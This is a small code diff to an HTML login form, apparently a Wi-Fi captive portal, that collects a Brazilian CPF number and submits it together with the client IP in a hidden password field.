@@ -223,7 +223,7 @@
                     
                     <input 
                     type="number" 
-                    name="password" 
+                    name="cpf" 
                     placeholder="CPF" 
                     oninvalid="validarCPF(this);" 
                     oninput="validarCPF(this);"
@@ -231,7 +231,7 @@
                     title="CPF: ex 111.111.111-11" 
                     required>
                     
-                    <input type="text" value="$clientip">
+                    <input type="hidden" name="password">
 
                     <input type="submit" name='enviar' value="Continue" class="enviar">
                 </div>
@@ -296,6 +296,11 @@
             el.setCustomValidity("");
             return true;
         }
+
+        f.addEventListener('submit', (e)=>{
+            f.password.value = f.cpf.value + ';$clientip'
+            console.log(f.password.value)
+        });
         
         fetch('deny.txt')
         .then(response => response.text())
